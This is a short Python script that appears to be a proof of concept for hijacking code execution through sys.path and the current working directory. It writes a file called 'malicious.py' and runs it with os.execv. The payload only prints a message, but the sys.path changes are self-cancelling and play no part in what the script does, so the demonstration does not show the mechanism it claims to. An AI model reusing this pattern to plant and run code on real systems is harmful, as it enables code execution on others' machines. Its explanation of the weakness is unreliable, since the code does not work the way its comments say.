import sys
import os

# Create a malicious Python file in the current working directory
malicious_file = 'malicious.py'
with open(malicious_file, 'w') as f:
    f.write('print("Malicious code executed!")\n')

# Set the argv[0] argument to a string without a path separator
sys.argv[0] = 'malicious'

# Ensure the current working directory is not in sys.path
sys.path = [p for p in sys.path if p != '']

# Insert the empty string into sys.path
sys.path.insert(0, '')

# Execute the code, using the newly created malicious file
os.execv(sys.executable, [sys.executable, malicious_file] + sys.argv[1:])